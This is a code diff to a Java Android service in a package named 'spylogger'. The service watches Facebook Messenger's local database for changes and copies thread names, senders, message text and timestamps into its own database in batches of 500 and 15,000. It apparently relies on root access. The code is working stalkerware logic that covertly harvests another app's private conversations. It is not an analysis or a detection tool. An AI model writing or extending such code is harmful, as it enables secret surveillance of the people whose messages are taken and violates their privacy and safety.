@@ -24,6 +24,7 @@ import com.gravatasufoca.spylogger.model.messenger.Thread;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.field.DataType;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
 
@@ -32,6 +33,8 @@ import org.json.JSONObject;
 
 import java.sql.SQLException;
 import java.util.ArrayList;
+import java.util.Date;
+import java.util.Iterator;
 import java.util.List;
 
 public class MessengerService extends Service {
@@ -39,12 +42,12 @@ public class MessengerService extends Service {
 	private String pathToWatch;
 	private String inFileName;
 	private Dao<Messages, Integer> daoMsgExternal;
-	private Dao<Thread, Integer> daoThreadExternal;
 
 	private DatabaseHelper dbHelper;
 
 	private DatabaseHelperFacebookThreads external;
     private final IBinder mBinder = new LocalBinder();
+	private Contact proprietario;
 
     public class LocalBinder extends Binder {
     	MessengerService getService() {
@@ -98,7 +101,7 @@ public class MessengerService extends Service {
 
 		Log.d("FACESLOG - FLAGS", Integer.toString(flags));
 		Utils.context=getApplicationContext();
-		updateMsg();
+		updateTopicos();
 
 		if(Utils.faceObserver==null)
 			setObserver();
@@ -118,7 +121,9 @@ public class MessengerService extends Service {
 				switch (event) {
 				case FileObserver.MODIFY:
 					Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
-					updateMsg();
+					proprietario=getProprietario(getApplicationContext());
+
+					updateTopicos();
 					break;
 				default:
 					// just ignore
@@ -130,53 +135,82 @@ public class MessengerService extends Service {
 		Utils.faceObserver.startWatching(); // START OBSERVING
 	}
 
-
-
-	private void updateMsg() {
-
+	private void updateTopicos() {
 		external = new DatabaseHelperFacebookThreads(getApplicationContext());
 		dbHelper = new DatabaseHelper((getApplicationContext()));
 
 		try {
 			dbHelper.getWritableDatabase();
 			daoMsgExternal = external.getMessagesDao();
-			daoThreadExternal = external.getThreadDao();
 
 			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");
 
 
-			GenericRawResults<String[]> raws= daoThreadExternal.queryRaw("select  thread_key from threads where thread_key not in( select idReferencia from localdb.topico )");
+			GenericRawResults<Object[]> raws= daoMsgExternal.queryRaw("select thread_key,snippet,senders,snippet_sender, timestamp_ms from threads where thread_key not in( select idReferencia from localdb.topico )",
+					new DataType[]{DataType.STRING,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG});
 			List<String> sThread=new ArrayList<>();
 
-			for(String[] resultRaw:raws){
-				sThread.add(resultRaw[0]);
-			}
-
-			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select msg_id from messages where msg_id not in( select idReferencia from localdb.mensagem )");
-			List<String> sMensagens=new ArrayList<>();
-			for(String[] resultRaw:rawResults){
-				sMensagens.add(resultRaw[0]);
-			}
-
-			List<Thread> threads=daoThreadExternal.query(daoThreadExternal.queryBuilder().where().in("thread_key",sThread).prepare());
-
-			Contact proprietario=getProprietario(getApplicationContext());
 			List<Topico> tt=new ArrayList<>();
-			for(Thread thread:threads){
+			Iterator<Object[]> iterator=raws.iterator();
+			int contador=0;
+			while (iterator.hasNext()){
+
+				Object[] raw=iterator.next();
+
+				Thread thread=new Thread();
+				thread.setThread_key((String) raw[0]);
+				thread.setSnippet(raw[1]!=null?(String) raw[1]:null);
+				thread.setTsenders(raw[2]!=null?(String) raw[2]:null);
+				thread.setTsnippet_sender(raw[3]!=null?(String) raw[3]:null);
+				thread.setTimestamp_ms(raw[4]!=null?(Date) raw[4]:null);
+
 				Topico topico=new Topico.TopicoBuilder()
-						.setIdReferencia(thread.getId().toString())
+						.setIdReferencia(thread.getThread_key())
 						.setNome(thread.getNomes(proprietario))
 						.setGrupo(thread.getSenders()!=null && thread.getSenders().size()>2)
 						.build(TipoMensagem.MESSENGER);
 				tt.add(topico);
+				contador++;
+				if(iterator.hasNext()){
+					if(contador==500){
+						contador=0;
+						dbHelper.getDao(Topico.class).create(tt);
+						tt=new ArrayList<>();
+					}
+				}else{
+					dbHelper.getDao(Topico.class).create(tt);
+				}
 			}
 
-			dbHelper.getDao(Topico.class).create(tt);
+			updateMsg(tt);
 
-			List<Messages> messages=daoMsgExternal.query(daoMsgExternal.queryBuilder().where().in("msg_id",sMensagens).prepare());
-			List<Topico> topicos=dbHelper.getDao(Topico.class).query(dbHelper.getDao(Topico.class).queryBuilder().where().in("idReferencia",sThread).prepare());
+		}catch (Exception e){
+			Log.e(this.getClass().getSimpleName(),e.getMessage());
+		}
+
+	}
+
+
+	private void updateMsg(List<Topico> tt) {
+
+		try {
+
+			GenericRawResults<Object[]> rawResults= daoMsgExternal.queryRaw("select msg_id,thread_key,text,tsender,timestamp_ms from messages where msg_id not in( select idReferencia from localdb.mensagem )",
+					new DataType[]{DataType.STRING,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG});
+
+			Iterator<Object[]> iterator=rawResults.iterator();
+
 			List<Mensagem> mensagens=new ArrayList<>();
-			for (Messages message : messages) {
+			int contador=0;
+			while (iterator.hasNext()) {
+				Object[] raw=iterator.next();
+
+				Messages message=new Messages();
+				message.setMsg_id(raw[0]!=null?(String) raw[0]:null);
+				message.setThread_key(raw[1]!=null?(String) raw[1]:null);
+				message.setText(raw[2]!=null?(String) raw[2]:null);
+				message.setTsender(raw[3]!=null?(String) raw[3]:null);
+				message.setTimestamp_ms(raw[4]!=null?(Date) raw[4]:null);
 
                 Sender sender=message.getSender();
                 if(sender==null)continue;
@@ -184,7 +218,7 @@ public class MessengerService extends Service {
                 boolean remetente=contato.equals(proprietario);
 
                 Topico tmpTopico = null;
-                for (Topico topico : topicos) {
+                for (Topico topico : tt) {
                     if (message.getThread_key().equals(topico.getIdReferencia())) {
                         tmpTopico = topico;
                         break;
@@ -207,10 +241,19 @@ public class MessengerService extends Service {
                         .setTemMedia(false).build();
 
 				mensagens.add(mensagem);
+				contador++;
+				if (iterator.hasNext()) {
+					if (contador == 15000) {
+						contador = 0;
+						dbHelper.getDao(Mensagem.class).create(mensagens);
+						mensagens = new ArrayList<>();
+					}
+				} else {
+					dbHelper.getDao(Mensagem.class).create(mensagens);
+				}
             }
 
-			dbHelper.getDao(Mensagem.class).create(mensagens);
-
+			Log.i(this.getClass().getSimpleName(), "TERMINOU");
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
